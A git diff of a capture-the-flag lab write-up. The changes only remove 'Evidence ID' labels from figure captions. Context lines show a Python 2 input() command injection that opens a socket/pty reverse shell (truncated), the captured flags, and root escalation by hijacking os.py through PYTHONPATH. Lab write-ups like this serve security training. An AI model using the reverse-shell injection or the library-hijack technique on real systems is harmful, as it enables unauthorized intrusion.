@@ -25,7 +25,7 @@ Port 10000 (snet-sensor-mgmt): Open
 
 ![Nmap Results](<./assets/Screenshot 1.png>)
 <br>
-*Figure 1: Evidence ID: 001 (Nmap Port Scanning Results).*
+*Figure 1: (Nmap Port Scanning Results).*
 
 ---
 
@@ -40,7 +40,7 @@ __import__('os').system('python -c "import socket,os,pty;s=socket.socket(socket.
 ```
 ![Initial Shell](<./assets/Screenshot 2.png>)
 <br>
-*Figure 2: Evidence ID: 002 (Successful Command Injection via Python 2 input).*
+*Figure 2: (Successful Command Injection via Python 2 input).*
 
 ---
 
@@ -52,7 +52,7 @@ User Flag: cf85ff769cfaa721758949bf870b019
 
 ![User Flag](<./assets/Screenshot 3.png>)
 <br>
-*Figure 3: Evidence ID: 003 (User Flag Captured: cf85ff769cfaa721758949bf870b019).*
+*Figure 3: (User Flag Captured: cf85ff769cfaa721758949bf870b019).*
 
 ---
 
@@ -75,7 +75,7 @@ export PYTHONPATH=/home/king
 
 ![Hijack Setup](<./assets/Screenshot 4.png>)
 <br>
-*Figure 4: Evidence ID: 004 (Python Library Hijacking - Malicious os.py setup).*
+*Figure 4: (Python Library Hijacking - Malicious os.py setup).*
 
 ---
 
@@ -98,7 +98,7 @@ Root Flag: 9c37646777a53910a347f387dce025ec
 
 ![Root Shell](<./assets/Screenshot 5.png>)
 <br>
-*Figure 5: Evidence ID: 005 (Root Privilege Escalation and Final Flag).*
+*Figure 5: (Root Privilege Escalation and Final Flag).*
 
 ---
 
